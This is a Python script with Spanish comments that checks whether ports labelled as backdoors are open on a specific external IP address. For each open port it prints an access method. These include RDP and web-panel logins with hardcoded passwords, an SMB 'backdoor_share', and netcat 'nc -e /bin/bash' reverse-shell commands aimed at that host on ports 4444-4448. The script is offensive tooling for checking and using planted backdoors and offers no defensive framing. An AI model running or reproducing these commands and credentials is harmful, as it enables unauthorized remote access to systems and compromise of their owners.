#!/usr/bin/env python3
"""
Script rápido para probar puertos de backdoors externos
"""

import socket
import time

def test_port(host, port, timeout=1):
    """Probar si un puerto está abierto"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def main():
    print("🔍 PRUEBA RÁPIDA DE PUERTOS EXTERNOS")
    print("=" * 50)
    
    # IP externa de los backdoors
    external_ip = "212.95.62.135"
    
    # Puertos de backdoors externos del report.json
    ports_to_test = [
        (2222, "SSH"),
        (1194, "OpenVPN"),
        (8080, "HTTP Web Panel"),
        (3389, "RDP"),
        (21, "FTP"),
        (23, "Telnet"),
        (5900, "VNC"),
        (445, "SMB"),
        (80, "HTTP"),
        (443, "HTTPS"),
        (4444, "Reverse Shell 1"),
        (4445, "Reverse Shell 2"),
        (4446, "Reverse Shell 3"),
        (4447, "Reverse Shell 4"),
        (4448, "Reverse Shell 5")
    ]
    
    print(f"🎯 Probando IP externa: {external_ip}")
    print()
    
    active_ports = []
    inactive_ports = []
    
    for port, service in ports_to_test:
        print(f"🔍 Probando {service} (puerto {port})...", end=" ")
        
        if test_port(external_ip, port):
            print("✅ ACTIVO")
            active_ports.append((port, service))
        else:
            print("❌ INACTIVO")
            inactive_ports.append((port, service))
    
    print("\n" + "=" * 50)
    print("📊 RESUMEN DE RESULTADOS:")
    print("=" * 50)
    
    if active_ports:
        print(f"✅ PUERTOS ACTIVOS ({len(active_ports)}):")
        for port, service in active_ports:
            print(f"   • {service}: {external_ip}:{port}")
    else:
        print("❌ NINGÚN PUERTO ACTIVO")
    
    if inactive_ports:
        print(f"\n❌ PUERTOS INACTIVOS ({len(inactive_ports)}):")
        for port, service in inactive_ports:
            print(f"   • {service}: {external_ip}:{port}")
    
    print(f"\n🎯 TOTAL: {len(active_ports)}/{len(ports_to_test)} puertos activos")
    
    if active_ports:
        print("\n🔑 MÉTODOS DE ACCESO EXTERNO DISPONIBLES:")
        for port, service in active_ports:
            if service == "RDP":
                print(f"   • RDP: xfreerdp /v:{external_ip}:{port} /u:svc_rdp /p:RDP_P@ssw0rd_2024!")
            elif service == "SSH":
                print(f"   • SSH: ssh svc_ssh@{external_ip} -p {port}")
            elif service == "FTP":
                print(f"   • FTP: ftp {external_ip} {port}")
            elif service == "Telnet":
                print(f"   • Telnet: telnet {external_ip} {port}")
            elif service == "VNC":
                print(f"   • VNC: vncviewer {external_ip}:{port}")
            elif service == "SMB":
                print(f"   • SMB: smbclient //{external_ip}/backdoor_share")
            elif service == "HTTP Web Panel":
                print(f"   • Web: http://admin:Web_P@ssw0rd_2024!@{external_ip}:{port}/admin")
            elif service == "HTTP":
                print(f"   • HTTP: http://{external_ip}:{port}")
            elif service == "HTTPS":
                print(f"   • HTTPS: https://{external_ip}:{port}")
            elif service == "OpenVPN":
                print(f"   • VPN: openvpn --config client.ovpn")
            elif "Reverse Shell" in service:
                print(f"   • Reverse: nc -e /bin/bash {external_ip} {port}")

if __name__ == "__main__":
    main()
